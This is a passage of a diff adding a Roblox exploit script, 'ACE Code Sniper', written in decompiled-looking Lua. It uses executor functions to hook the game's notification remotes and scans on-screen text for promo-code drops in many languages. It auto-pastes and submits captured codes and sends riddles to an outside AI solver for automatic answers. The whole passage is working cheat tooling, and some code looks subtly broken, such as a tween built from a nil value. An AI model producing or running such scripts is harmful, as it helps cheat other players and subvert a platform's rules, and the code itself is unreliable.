+                  v77:Create(v93, tweenInfo, { Transparency = tbl36.Active and 0.62 or 0.88 }):Play()
+
+                  v77
+                    :Create(frame12, tweenInfo, {
+                      BackgroundColor3 = tbl36.Active and tbl25.Window or tbl25.White,
+                      Position = tbl36.Active and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 2, 0.5, -10),
+                    })
+                    :Play()
+
+                  if arg6 then
+                    return
+                  end
+                  local v94 = false
+                  if arg4(tbl36.Active) == v94 then
+                    tbl36.SetState(false, true)
+                    return
+                  end
+                end,
+                Toggle = function()
+                  tbl36.SetState(not tbl36.Active)
+                end,
+              }
+
+              textButton2.MouseButton1Click:Connect(function()
+                tbl36.Toggle()
+              end)
+
+              textButton.MouseButton1Click:Connect(function()
+                local v94 = flag22
+                flag22 = flag22 ~= tbl36 and tbl36 or nil
+
+                if v94 then
+                  v94.RefreshKey()
+                end
+
+                tbl36.RefreshKey()
+              end)
+
+              tbl36.SetState(false, true)
+              table.insert(tbl35, tbl36)
+              return tbl36
+            end
+
+            local anchor = fn78("anchor", "Anchor", 32, fn67)
+            local autoBuy = fn78("autoBuy", "Auto buy", 82, fn74)
+            local textButton = Instance.new("TextButton")
+            textButton.Name = "ClearCodeBox"
+            textButton.Size = UDim2.new(1, -28, 0, tbl28.clearRowH)
+            textButton.Position = UDim2.fromOffset(17, 0)
+            textButton.BackgroundColor3 = tbl25.Log
+            textButton.BackgroundTransparency = 0.3
+            textButton.BorderSizePixel = 0
+            textButton.AutoButtonColor = false
+            textButton.Text = "CLEAR CODE BOX"
+            textButton.TextColor3 = tbl25.White
+            textButton.TextSize = 11
+            textButton.Font = Enum.Font.GothamBold
+            textButton.ZIndex = 4
+            textButton.Parent = tbl28.card.Parent
+            fn46(textButton, 10)
+            local v92 = createUIStroke2(textButton, tbl25.White, 1, 0.8)
+
+            local function fn79(arg)
+              v77
+                :Create(
+                  textButton,
+                  TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                  { BackgroundTransparency = arg and 0.02 or 0.3 }
+                )
+                :Play()
+              local v93
+              v77:Create(v92, v93, { Transparency = arg and 0.55 or 0.8 }):Play()
+            end
+
+            textButton.MouseEnter:Connect(function()
+              fn79(true)
+            end)
+
+            textButton.MouseLeave:Connect(function()
+              fn79(false)
+            end)
+
+            textButton.MouseButton1Down:Connect(function()
+              fn79(true)
+            end)
+
+            textButton.MouseButton1Up:Connect(function()
+              fn79(false)
+            end)
+
+            local v93 = 0
+
+            local function fn80(text, textColor3)
+              v93 += 1
+              local v94 = v93
+              textButton.Text = text
+              textButton.TextColor3 = textColor3
+
+              task.delay(0.9, function()
+                if v94 ~= v93 then
+                  return
+                end
+                textButton.Text = "CLEAR CODE BOX"
+                textButton.TextColor3 = tbl25.White
+              end)
+            end
+
+            textButton.MouseButton1Click:Connect(function()
+              local v94 = fn76()
+
+              if v94 == nil then
+                fn80("CLEAR FAILED", tbl25.Red)
+              elseif v94 > 0 then
+                fn80("CLEARED (" .. v94 .. ")", tbl25.Green)
+              else
+                fn80("ALREADY EMPTY", tbl25.Dim)
+              end
+            end)
+
+            tbl28.clearRow = textButton
+            tbl28.relayout(false)
+            anchor.KeyName = tbl18.anchorBind
+            autoBuy.KeyName = tbl18.autoBuyBind
+            fn77()
+
+            local function fn81(arg)
+              return string.sub(tostring(arg.Name), 1, 7) == "Gamepad"
+            end
+
+            local connection7 = nil
+
+            connection7 = v78.InputBegan:Connect(function(input, gameProcessed)
+              if not screenGui2 or not screenGui2.Parent then
+                connection7:Disconnect()
+                return
+              end
+              local keyCode = input.KeyCode
+              if keyCode == Enum.KeyCode.Unknown then
+                return
+              end
+
+              if input.UserInputType ~= Enum.UserInputType.Keyboard and not fn81(input.UserInputType) then
+                return
+              end
+
+              if flag22 then
+                local v94 = flag22
+                flag22 = nil
+
+                if keyCode ~= Enum.KeyCode.Escape and keyCode ~= Enum.KeyCode.ButtonB then
+                  if keyCode == Enum.KeyCode.Backspace or keyCode == Enum.KeyCode.Delete then
+                    v94.KeyName = ""
+                  else
+                    v94.KeyName = keyCode.Name
+                  end
+
+                  if v94.Id == "anchor" then
+                    tbl18.anchorBind = v94.KeyName
+                  else
+                    tbl18.autoBuyBind = v94.KeyName
+                  end
+
+                  fn31()
+                end
+
+                fn77()
+                return
+              end
+
+              if gameProcessed then
+                return
+              end
+
+              if v78:GetFocusedTextBox() then
+                return
+              end
+
+              for _, v94 in ipairs(tbl35) do
+                if v94.KeyName ~= "" and v94.KeyName == keyCode.Name then
+                  v94.Toggle()
+                end
+              end
+            end)
+
+            if getgenv then
+              getgenv().ACECodeSniperStopFarm = function()
+                fn67(false)
+                fn74(false)
+
+                if connection7 then
+                  pcall(function()
+                    connection7:Disconnect()
+                  end)
+
+                  connection7 = nil
+                end
+              end
+            end
+          end
+
+          fn64()
+          fn52(tbl18.backgroundIndex)
+          fn54(tbl18.guiScale)
+        end
+
+        local function aceCodeSniperOpenAnimation()
+          local guiScale = tbl18.guiScale
+          fn48()
+          local scale = uiScale.Scale
+          uiScale.Scale = math.max(0.05, (scale or guiScale) * 0.6)
+          v77:Create(uiScale, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = scale }):Play()
+        end
+
+        if getgenv then
+          getgenv().ACECodeSniperOpenAnimation = aceCodeSniperOpenAnimation
+        end
+
+        aceCodeSniperOpenAnimation()
+
+        do
+          local flag18 = false
+          local v90 = nil
+          local vector2 = nil
+          local position = nil
+          local flag19 = false
+          local touchEnabled = v78.TouchEnabled and 8 or 3
+
+          local function fn53(arg)
+            if not v78.TouchEnabled then
+              return false
+            end
+            local absolutePosition = frame3.AbsolutePosition
+            local absoluteSize = frame3.AbsoluteSize
+            return arg.X >= absolutePosition.X + absoluteSize.X - 76
+              and arg.Y >= absolutePosition.Y
+              and arg.Y <= absolutePosition.Y + absoluteSize.Y
+          end
+
+          local function fn54(arg)
+            if arg ~= v90 then
+              return
+            end
+
+            if flag19 then
+              local position2 = frame2.Position
+              tbl18.windowPosition =
+                { xScale = position2.X.Scale, xOffset = position2.X.Offset, yScale = position2.Y.Scale, yOffset = position2.Y.Offset }
+              fn31()
+            end
+
+            flag18 = false
+            v90 = nil
+            vector2 = nil
+            position = nil
+          end
+
+          frame3.InputBegan:Connect(function(input)
+            if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
+              return
+            end
+
+            if flag18 or fn53(input.Position) then
+              return
+            end
+            flag18 = true
+            v90 = input
+            vector2 = Vector2.new(input.Position.X, input.Position.Y)
+            position = frame2.Position
+            flag19 = false
+
+            input.Changed:Connect(function()
+              if input.UserInputState == Enum.UserInputState.End or input.UserInputState == Enum.UserInputState.Cancel then
+                fn54(input)
+              end
+            end)
+          end)
+
+          v78.InputChanged:Connect(function(input)
+            if not flag18 or not v90 then
+              return
+            end
+
+            if
+              not (v90.UserInputType == Enum.UserInputType.Touch and input == v90)
+              and not (v90.UserInputType == Enum.UserInputType.MouseButton1 and input.UserInputType == Enum.UserInputType.MouseMovement)
+            then
+              return
+            end
+            local n41 = Vector2.new(input.Position.X, input.Position.Y) - vector2
+
+            if not flag19 then
+              if n41.Magnitude < touchEnabled then
+                return
+              end
+              flag19 = true
+            end
+
+            frame2.Position = UDim2.new(position.X.Scale, position.X.Offset + n41.X, position.Y.Scale, position.Y.Offset + n41.Y)
+          end)
+        end
+
+        local function fn53(arg)
+          if arg == tbl25.Green then
+            return tbl29.Green
+          end
+
+          if arg == tbl25.Red then
+            return tbl29.Red
+          end
+
+          if arg == tbl25.Text then
+            return tbl29.Amber
+          end
+
+          if arg == tbl25.White then
+            return tbl29.Cyan
+          end
+          return tbl29.Dim
+        end
+
+        fn32 = function(arg, arg2, arg3, arg4)
+          if not instance then
+            return
+          end
+          local str9 = tostring(arg) .. "\0" .. tostring(arg3)
+          if str9 == str8 then
+            return
+          end
+          str8 = str9
+          arg2 = arg2 or tbl25.Dim
+          fn51(arg, fn53(arg2), arg3, arg4)
+
+          if tbl28.setLine then
+            tbl28.setLine(arg4 and arg4 .. ": " .. tostring(arg) or arg, arg2, arg3)
+          end
+
+          if tbl28.notifOpen then
+            fn50()
+          end
+        end
+
+        tbl28.statusLineHandle = function()
+          return tbl27[#tbl27]
+        end
+
+        tbl28.updateStatusLine = function(arg, arg2, arg3, arg4)
+          if not arg or not arg.Parent then
+            return false
+          end
+
+          if tbl27[#tbl27] ~= arg then
+            return false
+          end
+          arg3 = arg3 or tbl25.Dim
+          local body = arg:FindFirstChild("Body")
+
+          if body then
+            body.Text = tostring(arg2)
+            body.TextColor3 = fn53(arg3)
+          end
+
+          local tag = arg:FindFirstChild("Tag")
+
+          if tag then
+            tag.Text = arg4 and tostring(arg4) or ""
+          end
+
+          str8 = tostring(arg2) .. "\0" .. tostring(arg4)
+
+          if tbl28.setLine then
+            tbl28.setLine(arg2, arg3, arg4)
+          end
+
+          return true
+        end
+
+        do
+          local function fn54()
+            tbl21 = {}
+            n33 = 0
+          end
+
+          fn35 = function()
+            tbl21 = {}
+            n33 = 0
+          end
+
+          local function fn55(arg, text)
+            if not arg then
+              return false
+            end
+            n34 = os.clock() + 0.4
+            n35 += 1
+            local v90 = n35
+
+            pcall(function()
+              arg.ClearTextOnFocus = false
+            end)
+
+            if not pcall(function()
+              arg.Text = text
+            end) then
+              return false
+            end
+
+            task.spawn(function()
+              for i = 1, 6 do
+                task.wait()
+                if v90 ~= n35 then
+                  return
+                end
+
+                if not arg.Parent then
+                  return
+                end
+                local text2 = arg.Text
+                if text2 == text then
+                  return
+                end
+
+                if text2 ~= "" and not string.find(text, text2, 1, true) then
+                  return
+                end
+                n34 = os.clock() + 0.4
+
+                pcall(function()
+                  arg.Text = text
+                end)
+              end
+            end)
+
+            return true
+          end
+
+          local function fn56()
+            if connection then
+              pcall(function()
+                connection:Disconnect()
+              end)
+            end
+
+            if connection2 then
+              pcall(function()
+                connection2:Disconnect()
+              end)
+            end
+
+            for _, v90 in ipairs(tbl22) do
+              pcall(function()
+                v90:Disconnect()
+              end)
+            end
+
+            connection = nil
+            connection2 = nil
+            tbl22 = {}
+            v82 = nil
+          end
+
+          local function fn57(arg)
+            if not arg or not arg.Parent then
+              return false
+            end
+
+            while arg do
+              if arg:IsA("GuiObject") and arg.Visible == false then
+                return false
+              end
+
+              if arg:IsA("ScreenGui") and arg.Enabled == false then
+                return false
+              end
+              arg = arg.Parent
+            end
+
+            return true
+          end
+
+          local function fn58()
+            local v90 = playerGui
+
+            for _, v91 in ipairs(tbl23) do
+              if v90 then
+                v90 = v90:FindFirstChild(v91)
+                continue
+              end
+              break
+            end
+
+            if v90 and v90:IsA("TextBox") and fn57(v90) then
+              return v90
+            end
+
+            if fn57(v80) then
+              return v80
+            end
+
+            if fn57(v81) then
+              return v81
+            end
+            return fn40()
+          end
+
+          local function fn59(arg)
+            if not arg or v82 == arg then
+              return
+            end
+            fn56()
+            v82 = arg
+
+            pcall(function()
+              arg.ClearTextOnFocus = false
+            end)
+
+            if arg.Text ~= "" then
+              str7 = arg.Text
+            end
+
+            connection = arg:GetPropertyChangedSignal("Text"):Connect(function()
+              if arg.Text ~= "" then
+                str7 = arg.Text
+                return
+              end
+
+              if os.clock() < n34 then
+                return
+              end
+
+              if #tbl21 > 0 and os.clock() - n33 <= 25 then
+                fn55(arg, table.concat(tbl21))
+                return
+              end
+              fn54()
+            end)
+
+            connection2 = arg.AncestryChanged:Connect(function(child, parent)
+              if not parent then
+                fn56()
+              end
+            end)
+
+            local parent = arg
+
+            while parent do
+              if parent:IsA("GuiObject") then
+                table.insert(
+                  tbl22,
+                  parent:GetPropertyChangedSignal("Visible"):Connect(function()
+                    if not fn57(arg) then
+                      fn56()
+                    end
+                  end)
+                )
+              elseif parent:IsA("ScreenGui") then
+                table.insert(
+                  tbl22,
+                  parent:GetPropertyChangedSignal("Enabled"):Connect(function()
+                    if not fn57(arg) then
+                      fn56()
+                    end
+                  end)
+                )
+              end
+
+              parent = parent.Parent
+            end
+          end
+
+          v78.TextBoxFocused:Connect(function(arg)
+            if arg:IsDescendantOf(screenGui2) then
+              return
+            end
+
+            if arg ~= fn40() then
+              return
+            end
+            v80 = arg
+            v81 = arg
+            fn59(arg)
+          end)
+
+          v78.TextBoxFocusReleased:Connect(function(arg)
+            if arg:IsDescendantOf(screenGui2) then
+              return
+            end
+            local v90 = fn40()
+            if arg ~= v90 and arg ~= v81 then
+              return
+            end
+
+            if retypeInvalid and fn33 and (arg == v90 or arg == v81) then
+              fn33(arg, arg.Text ~= "" and arg.Text or str7, false)
+            end
+
+            if v80 == arg then
+              v80 = nil
+            end
+
+            return
+          end)
+
+          fn34 = function()
+            v85 += 1
+            v83 = nil
+            v84 = nil
+            n37 = 0
+          end
+
+          fn33 = function(arg, arg2, arg3)
+            if not retypeInvalid or not arg2 or arg2 == "" then
+              return
+            end
+
+            if not arg3 and v83 and os.clock() <= n37 then
+              return
+            end
+            v85 += 1
+            local v90 = v85
+            v83 = arg2
+            v84 = arg
+            local v91 = 12
+            n37 = os.clock() + v91
+
+            task.delay(8, function()
+              if v90 == v85 then
+                fn34()
+              end
+            end)
+          end
+
+          local function fn60(arg, arg2)
+            if not retypeInvalid or not arg2 or arg2 == "" then
+              return false
+            end
+            v76.Heartbeat:Wait()
+            local v90 = fn58() or arg
+            if not v90 or not fn57(v90) then
+              return false
+            end
+            local v91 = fn55(v90, arg2)
+
+            if v91 then
+              v81 = v90
+              fn59(v90)
+            end
+
+            return v91
+          end
+
+          local function fn61(arg, arg2)
+            if arg2 and arg2:IsDescendantOf(screenGui2) then
+              return
+            end
+            local str9 = tostring(arg or ""):lower()
+
+            if
+              (str9:find("unexpected error", 1, true) or str9:find("something went wrong", 1, true))
+              and v86
+              and os.clock() - n38 <= 6
+              and not flag16
+              and not flag17
+            then
+              flag16 = true
+              flag17 = true
+              local redeemedAfterRetry = v86
+              local v90 = n39
+              fn32("Temporary redeem error - retrying...", tbl25.Text)
+
+              task.delay(0.45, function()
+                if v90 ~= n39 or not flag17 then
+                  return
+                end
+                local success, v91
+
+                if fn42() then
+                  success, v91 = fn43(redeemedAfterRetry)
+                else
+                  success, v91 = fn44(redeemedAfterRetry)
+
+                  if not success then
+                    success, v91 = fn41(redeemedAfterRetry)
+                  end
+                end
+
+                flag17 = false
+
+                if success then
+                  success = type(v91) ~= "table" or v91.success or v91.Success
+                end
+
+                if success then
+                  fn32("Redeemed after retry: " .. redeemedAfterRetry, tbl25.Green)
+                else
+                  fn32("Redeem retry failed", tbl25.Red)
+                end
+              end)
+
+              return
+            end
+
+            if not retypeInvalid or not v83 then
+              return
+            end
+
+            if n37 < os.clock() then
+              fn34()
+              return
+            end
+
+            if
+              not (
+                str9:find("invalid code", 1, true)
+                or str9:find("code is invalid", 1, true)
+                or str9:find("expired", 1, true)
+                or str9:find("already redeemed", 1, true)
+                or str9:find("already used", 1, true)
+                or str9:find("doesn't exist", 1, true)
+                or str9:find("does not exist", 1, true)
+                or str9:find("not found", 1, true)
+                or str9:find("rejected", 1, true)
+              )
+            then
+              return
+            end
+            local v90 = v83
+            local v91 = fn60(v84, v83)
+            fn34()
+
+            if v91 then
+              fn32("Invalid - repasted: " .. v90, tbl25.Red)
+            end
+          end
+
+          local function fn62(arg)
+            if not arg or arg == "" then
+              return
+            end
+
+            if #tbl21 > 0 and os.clock() - n33 > 25 then
+              fn54()
+            end
+
+            if v82 and not fn57(v82) then
+              fn56()
+            end
+
+            n33 = os.clock()
+            local v90 = fn40()
+            tbl21[#tbl21 + 1] = arg
+            local redeemed = table.concat(tbl21)
+            local n41 = #tbl21
+
+            if v90 then
+              v81 = v90
+              fn59(v90)
+              local flag18 = v78:GetFocusedTextBox() == v90
+              fn55(v90, redeemed)
+
+              if flag18 then
+                pcall(function()
+                  local cursorPosition = #redeemed + 1
+                  v90.CursorPosition = cursorPosition
+                  v90.SelectionStart = cursorPosition
+                end)
+              end
+            else
+              fn32("Captured; code box is closed", tbl25.Text)
+            end
+
+            fn32(redeemed, tbl25.Green, autoSubmit and tostring(n41) .. "/" .. tostring(submitAfter) or nil, "CODE")
+
+            if submitAfter <= n41 then
+              tbl21 = {}
+
+              if autoSubmit then
+                fn33(v90, redeemed, true)
+                local v91, v92 = fn45(redeemed)
+
+                if v91 and (type(v92) ~= "table" or v92.success or v92.Success) then
+                  fn34()
+                  fn32("Redeemed: " .. redeemed, tbl25.Green)
+                else
+                  local v93 = fn60(v90, redeemed)
+                  fn34()
+
+                  if v93 then
+                    fn32("Invalid - repasted: " .. redeemed, tbl25.Red)
+                  else
+                    fn32("Invalid / cooldown", tbl25.Red)
+                  end
+                end
+              end
+
+              tbl19.disarm("code submitted")
+            end
+          end
+
+          local function fn63(arg)
+            if not (arg:IsA("TextLabel") or arg:IsA("TextButton")) then
+              return
+            end
+            fn61(arg.Text or "", arg)
+
+            arg:GetPropertyChangedSignal("Text"):Connect(function()
+              fn61(arg.Text or "", arg)
+            end)
+          end
+
+          for _, descendant in ipairs(playerGui:GetDescendants()) do
+            fn63(descendant)
+          end
+
+          playerGui.DescendantAdded:Connect(function(descendant)
+            task.wait(0.04)
+            fn63(descendant)
+          end)
+
+          local function fn64(arg)
+            if not getupvalues_ then
+              return {}
+            end
+            local ok, result = pcall(getupvalues_, arg)
+            local tbl30 = {}
+
+            if ok and type(result) == "table" then
+              for _, v90 in pairs(result) do
+                if
+                  typeof(v90) == "Instance"
+                  and (v90:IsA("RemoteEvent") or v90:IsA("RemoteFunction") or v90:IsA("UnreliableRemoteEvent"))
+                  and v90.Parent == net
+                then
+                  table.insert(tbl30, v90)
+                end
+              end
+            end
+
+            return tbl30
+          end
+
+          local tbl30 = { "Start", "Init", "KnitStart", "KnitInit", "OnStart" }
+
+          local function fn65()
+            local ok, result = pcall(function()
+              return require(v75.Controllers:FindFirstChild("NotificationController", true))
+            end)
+
+            if not (ok and type(result) == "table") then
+              return {}
+            end
+            local tbl31 = {}
+            local tbl32 = {}
+
+            for _, v90 in ipairs(tbl30) do
+              local v91 = nil
+
+              pcall(function()
+                v91 = result[v90]
+              end)
+
+              if type(v91) == "function" then
+                for _, v92 in ipairs(fn64(v91)) do
+                  if not tbl32[v92] then
+                    tbl32[v92] = true
+                    tbl31[#tbl31 + 1] = v92
+                  end
+                end
+              end
+            end
+
+            return tbl31
+          end
+
+          local tbl31 = {
+            Top = true,
+            Bottom = true,
+            Center = true,
+            Middle = true,
+            Left = true,
+            Right = true,
+            TopRight = true,
+            TopLeft = true,
+            BottomRight = true,
+            BottomLeft = true,
+          }
+
+          local tbl32 = {
+            "Text",
+            "text",
+            "Message",
+            "message",
+            "Title",
+            "title",
+            "Body",
+            "body",
+            "Content",
+            "content",
+            "Description",
+            "description",
+            "Announcement",
+            "announcement",
+          }
+
+          local function fn66(arg)
+            return arg:find("Sounds%.") ~= nil or arg:find("rbxassetid") ~= nil or tbl31[arg] ~= nil
+          end
+
+          local function fn67(...)
+            local v90 = table.pack(...)
+            if v90.n == 0 then
+              return nil
+            end
+
+            if typeof(v90[1]) == "string" and v90[1]:match("%S") then
+              return v90[1]
+            end
+
+            for i = 1, v90.n do
+              local v91 = v90[i]
+
+              if typeof(v91) == "string" then
+                if v91:match("%S") and not fn66(v91) then
+                  return v91
+                end
+                continue
+              end
+
+              if typeof(v91) == "table" then
+                for _, v92 in ipairs(tbl32) do
+                  local v93 = nil
+
+                  pcall(function()
+                    v93 = v91[v92]
+                  end)
+
+                  if type(v93) == "string" and v93:match("%S") then
+                    return v93
+                  end
+                end
+              end
+            end
+
+            return nil
+          end
+
+          local function fn68(...)
+            return fn67(...) ~= nil
+          end
+
+          local function fn69(arg)
+            local v90 = "function"
+            if type(arg) ~= v90 then
+              return tostring(arg)
+            end
+            return (arg:gsub("<[^>]->", ""))
+          end
+
+          local function fn70(arg)
+            return arg
+          end
+
+          local function fn71(arg)
+            local tbl33 = {}
+
+            for match in arg:gmatch("[%w_]+") do
+              tbl33[#tbl33 + 1] = match
+            end
+
+            return tbl33
+          end
+
+          local tbl33 = {
+            "code is",
+            "codes is",
+            "code was",
+            "code word is",
+            "codeword is",
+            "code:",
+            "codes:",
+            "code =",
+            "use code",
+            "use the code",
+            "use this code",
+            "using code",
+            "enter code",
+            "enter the code",
+            "enter this code",
+            "type code",
+            "type the code",
+            "type this code",
+            "redeem code",
+            "redeem the code",
+            "redeem this code",
+            "claim code",
+            "claim the code",
+            "promo code",
+            "gift code",
+            "bonus code",
+            "free code",
+            "secret code",
+            "codigo es",
+            "codigo e",
+            "codigo:",
+            "code est",
+            "code ist",
+            "codice e",
+            "kod to",
+            "kodu",
+            "codul este",
+            "kode",
+          }
+
+          local tbl34 = {}
+
+          for match in
+            ("a an the is are was were be it this that these those here there now then\r\nnext new soon below above coming incoming dropping drop ready go going gonna\r\nbeing get got in on at for to of and or but you your my our up out\r\none two three first second last final part parts word words\r\ncode codes codeword free time live active valid expired chat everyone guys\r\n"):gmatch(
+              "%S+"
+            )
+          do
+            tbl34[match] = true
+          end
+
+          local function fn72(arg)
+            if #arg < 3 or #arg > 30 then
+              return false
+            end
+
+            if tbl34[arg:lower()] then
+              return false
+            end
+
+            if arg:find("%d") then
+              return true
+            end
+            local v90 = 0
+
+            for match in arg:gmatch("%u") do
+              v90 += 1
+            end
+
+            return v90 >= 2
+          end
+
+          local function fn73(arg)
+            local str9 = arg:lower()
+            local v90 = nil
+            local v91 = nil
+
+            for _, v92 in ipairs(tbl33) do
+              local n41 = 1
+
+              while true do
+                local pos, v93 = str9:find(v92, n41, true)
+
+                if not v93 then
+                  break
+                else
+                  local match = arg:match("^[%s:%-=%.]*([%w_]+)", v93 + 1)
+
+                  if match and fn72(match) and (not v90 or v93 < v90) then
+                    v90 = v93
+                    v91 = match
+                  end
+
+                  n41 = v93 + 1
+                end
+              end
+            end
+
+            return v91
+          end
+
+          local tbl35 = {
+            "next code",
+            "new code",
+            "another code",
+            "one more code",
+            "code time",
+            "code drop",
+            "code alert",
+            "code hunt",
+            "code below",
+            "dropping a code",
+            "drop a code",
+            "dropping code",
+            "code coming",
+            "code incoming",
+            "incoming code",
+            "code for you",
+            "code will be",
+            "code released",
+            "releasing a code",
+            "releasing the code",
+            "code activated",
+            "code number",
+            "here is the code",
+            "heres the code",
+            "here's the code",
+            "got a code",
+            "have a code",
+            "get this code",
+            "take this code",
+            "typing a code",
+            "spelling a code",
+            "spelling out",
+            "spelling it out",
+            "letter by letter",
+            "word by word",
+            "one word at a time",
+            "open your codes",
+            "open the codes",
+            "codes menu",
+            "reward code",
+            "event code",
+            "update code",
+            "daily code",
+            "weekend code",
+            "birthday code",
+            "milestone code",
+            "sammy code",
+            "want a code",
+            "who wants a code",
+            "need a code",
+            "chat code",
+            "codigo nuevo",
+            "nuevo codigo",
+            "codigo gratis",
+            "aqui esta el codigo",
+            "canjea",
+            "canjear",
+            "canjeen",
+            "codigo novo",
+            "novo codigo",
+            "aqui esta o codigo",
+            "resgate",
+            "resgatar",
+            "nouveau code",
+            "code gratuit",
+            "voici le code",
+            "echangez",
+            "neuer code",
+            "gratis code",
+            "hier ist der code",
+            "einlosen",
+            "nuovo codice",
+            "codice gratis",
+            "ecco il codice",
+            "riscatta",
+            "nieuwe code",
+            "hier is de code",
+            "nowy kod",
+            "darmowy kod",
+            "wpisz kod",
+            "yeni kod",
+            "bedava kod",
+            "iste kod",
+            "kodenya",
+            "kode baru",
+            "kode gratis",
+            "gunakan kode",
+            "bagong code",
+            "libreng code",
+            "code moi",
+            "ma moi",
+            "cod nou",
+          }
+
+          local tbl36 = {
+            "what",
+            "which",
+            "who",
+            "whose",
+            "when",
+            "where",
+            "why",
+            "how",
+            "riddle",
+            "quiz",
+            "puzzle",
+            "trivia",
+            "anagram",
+            "unscramble",
+            "scrambled",
+            "jumbled",
+            "solve",
+            "guess",
+            "answer",
+            "answers",
+            "brain teaser",
+            "brainteaser",
+            "true or false",
+            "odd one out",
+            "fill in the blank",
+            "rhymes with",
+            "name the",
+            "count the",
+            "acertijo",
+            "adivinanza",
+            "adivina",
+            "adivinha",
+            "charada",
+            "pregunta",
+            "enigme",
+            "devinette",
+            "ratsel",
+            "frage",
+            "indovinello",
+            "domanda",
+            "raadsel",
+            "zagadka",
+            "bilmece",
+            "bulmaca",
+            "bugtong",
+            "tebak",
+            "teka teki",
+            "cau do",
+            "ghicitoare",
+            "respuesta",
+            "resposta",
+            "reponse",
+            "antwort",
+            "risposta",
+            "antwoord",
+            "odpowiedz",
+            "cevap",
+            "sagot",
+            "jawabannya",
+            "dap an",
+            "raspunsul",
+          }
+
+          local tbl37 = nil
+
+          local function fn74()
+            if tbl37 then
+              return tbl37
+            end
+
+            local function fn75(arg)
+              local tbl38 = {}
+
+              for _, v90 in ipairs(arg) do
+                local v91 = tbl19.normalize(v90)
+
+                if #v91 > 2 then
+                  tbl38[#tbl38 + 1] = v91
+                end
+              end
+
+              return tbl38
+            end
+
+            tbl37 = { code = fn75(tbl33), riddle = fn75(tbl36) }
+            local v90 = ipairs
+            local v91 = fn75(tbl35)
+
+            for _, v92 in v90(v91) do
+              tbl37.code[#tbl37.code + 1] = v92
+            end
+
+            return tbl37
+          end
+
+          local function fn75(arg)
+            if arg:find("?", 1, true) then
+              return false
+            end
+            local v90 = fn74()
+            local v91 = tbl19.normalize(arg)
+
+            for _, v92 in ipairs(v90.riddle) do
+              if v91:find(v92, 1, true) then
+                return false
+              end
+            end
+
+            for _, v92 in ipairs(v90.code) do
+              if v91:find(v92, 1, true) then
+                return true
+              end
+            end
+
+            return false
+          end
+
+          local function fn76(arg)
+            local str9 = arg:lower()
+            return str9:find("sammy%s+spawned") ~= nil or str9:find("sammy%s+activated") ~= nil
+          end
+
+          local n41 = 0
+          local v90 = 0
+          local v91 = 0
+          local tbl38
+
+          tbl38 = {
+            limit = 34,
+            log = {},
+            remember = function(arg)
+              tbl38.log[#tbl38.log + 1] = arg
+
+              while #tbl38.log > tbl38.limit do
+                table.remove(tbl38.log, 1)
+              end
+            end,
+            context = function()
+              local tbl39 = {}
+
+              for _, v92 in ipairs(tbl38.log) do
+                tbl39[#tbl39 + 1] = v92
+              end
+
+              return tbl39
+            end,
+            answerPair = function(arg)
+              if not arg or arg.riddle ~= true or type(arg.answers) ~= "table" then
+                return nil, nil
+              end
+              local v92 = nil
+              local v93 = nil
+
+              for _, answer in ipairs(arg.answers) do
+                v93 = fn39(answer)
+
+                if v93 and v93 ~= v92 then
+                  if not v92 then
+                    v92 = v93
+                    v93 = nil
+                    continue
+                  end
+                else
+                  v93 = nil
+                  continue
+                end
+
+                break
+              end
+
+              return v92, v93
+            end,
+          }
+
+          local tbl39 = {}
+
+          local function fn77(arg, arg2, arg3)
+            local flag18 = arg2 ~= false
+            arg3 = arg3 and " " .. arg3 or ""
+            fn54()
+            tbl39[arg] = os.clock() + 2.5
+            local v92 = fn40()
+
+            if v92 then
+              v81 = v92
+              fn59(v92)
+              fn55(v92, arg)
+
+              if not aiAutoSubmit then
+                fn32("Riddle typed" .. arg3 .. ": " .. arg, tbl25.Green)
+                tbl19.disarm("riddle answered")
+                return true
+              end
+
+              fn33(v92, arg, true)
+              local success, v93 = fn45(arg)
+              success = success and (type(v93) ~= "table" or v93.success or v93.Success)
+
+              if success then
+                fn34()
+                fn32("Riddle redeemed" .. arg3 .. ": " .. arg, tbl25.Green)
+              else
+                fn32("Riddle answer" .. arg3 .. " rejected / cooldown", tbl25.Red)
+              end
+
+              if flag18 then
+                tbl19.disarm("riddle answered")
+              end
+
+              return success
+            end
+
+            fn32("Riddle solved; code box is closed", tbl25.Text)
+
+            if flag18 then
+              tbl19.disarm("riddle answered")
+            end
+
+            return false
+          end
+
+          local function fn78(arg, arg2, arg3)
+            n41 += 1
+            fn32("Solving riddle...", tbl25.Text)
+            local v92 = n36
+
+            task.spawn(function()
+              local solve =
+                fn38("/solve", { message = arg, model = tbl24.RaceModels and tbl24.BackupModel or tbl24.PrimaryModel, history = arg3 })
+              n41 = math.max(0, n41 - 1)
+              if not tbl24.Enabled or not tbl24.AIRiddles then
+                return
+              end
+
+              if v92 ~= n36 then
+                fn32("Riddle answer dropped - solver switched off", tbl25.Dim)
+                return
+              end
+              local v93, v94 = tbl38.answerPair(solve)
+
+              if v93 and arg2 >= v91 then
+                v91 = arg2
+                local flag18 = backupRiddle and aiAutoSubmit and v94 ~= nil
+                fn77(v93, not flag18, flag18 and "1/2" or nil)
+
+                if flag18 then
+                  local function fn79()
+                    return arg2 == v91 and tbl24.Enabled and tbl24.AIRiddles and v92 == n36 and aiAutoSubmit and backupRiddle
+                  end
+
+                  local n42 = os.clock() + 10.35
+
+                  local function fn80(arg4)
+                    return string.format("Trying backup code - code cooldown %.1fs", arg4)
+                  end
+
+                  local text = tbl25.Text
+                  fn32(fn80(10.35), text)
+                  local v95 = tbl28.statusLineHandle()
+
+                  while fn79() do
+                    local n43 = n42 - os.clock()
+
+                    if not (n43 <= 0) then
+                      local text2 = tbl25.Text
+
+                      if not tbl28.updateStatusLine(v95, fn80(n43), text2) then
+                        local text3 = tbl25.Text
+                        fn32(fn80(n43), text3)
+                        v95 = tbl28.statusLineHandle()
+                      end
+
+                      task.wait(0.1)
+                      continue
+                    end
+
+                    break
+                  end
+
+                  if fn79() then
+                    fn77(v94, true, "2/2")
+                  else
+                    tbl19.disarm("riddle backup cancelled")
+                  end
+                end
+              elseif solve and solve.error then
+                local str9 = solve.httpStatus and "AI HTTP " .. tostring(solve.httpStatus) .. ": " or "AI: "
+                local red = tbl25.Red
+                fn32(str9 .. tostring(solve.error), red)
+              elseif not v93 then
+                fn32("Riddle UNKNOWN", tbl25.Red)
+              end
+            end)
